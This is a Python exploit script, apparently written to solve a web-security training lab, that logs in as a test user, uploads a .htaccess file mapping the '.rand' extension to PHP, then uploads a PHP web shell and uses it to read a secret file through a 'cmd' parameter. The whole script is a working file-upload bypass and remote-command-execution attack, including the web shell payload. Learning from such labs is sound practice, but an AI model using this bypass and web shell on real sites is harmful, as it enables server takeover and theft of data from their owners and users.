
"""
before Run this script
do this :
1. upload .htaccess file 
2. than upload your .rand file 
3. after uploading successfully both file 
4. run your attack script. 

"""


import requests
import sys
import urllib3
from bs4 import BeautifulSoup as bs
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, proxies=proxies, verify=False)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def exploit_file_upload(s, url):
    # get csrf token 
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    
    data_login = {"csrf" : csrf_token, "username" : "wiener", "password" : "peter"}
    r = s.post(login_url, data=data_login, proxies=proxies, verify=False)
    
    if "Log out" in r.text:
        print("[+] Login successfull as wiener account...")
        
        # uploading .htaccess file 
        print("uploading .htaccess file...")
        my_acc_url = url + "/my-account"
        csrf = get_csrf_token(s, my_acc_url)
        avatar_url = url + "/my-account/avatar"
        param = {
            "avatar":
            (
                '.htaccess',
                'AddType application/x-httpd-php .rand',
                'application/octet-stream'
            ),
            'user': 'wiener',
            'csrf':csrf
        }
        
        boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        m = MultipartEncoder(
            fields=param,
            boundary=boundary
        )
        
        headers = {
            'Content-Type': m.content_type
        }
        
        r = s.post(avatar_url, data=m, headers=headers, proxies=proxies, verify=False)
        
        # upload web shell
        print("[+] Uploading web shell...")
        param2 = {
            "avatar":
            (
                'payload.rand',
                "<?php echo shell_exec($_GET['cmd']); ?>",
                'application/octet-stream'
            ),
            'user': 'wiener',
            'csrf':csrf_token
        }
        
        m2 = MultipartEncoder(
            fields=param2,
            boundary=boundary
        )
        headers = {
            'Content-Type': m2.content_type
        }
        
        r = s.post(avatar_url, data=m2, headers=headers, proxies=proxies, verify=False)
        
        # secret file output print
        print(" your secret key is: ")
        cmd_url = url + '/files/avatars/payload.rand?cmd=cat /home/carlos/secret'
        r = s.get(cmd_url, proxies=proxies, verify=False)
        print(r.text)
        
    else:
        print("[-] Login failed...")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        sys.stderr.write("\n" + " Usage " + sys.argv[0] + " <url> \n\n")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1]
    exploit_file_upload(s, url)



if __name__ == "__main__":
    main()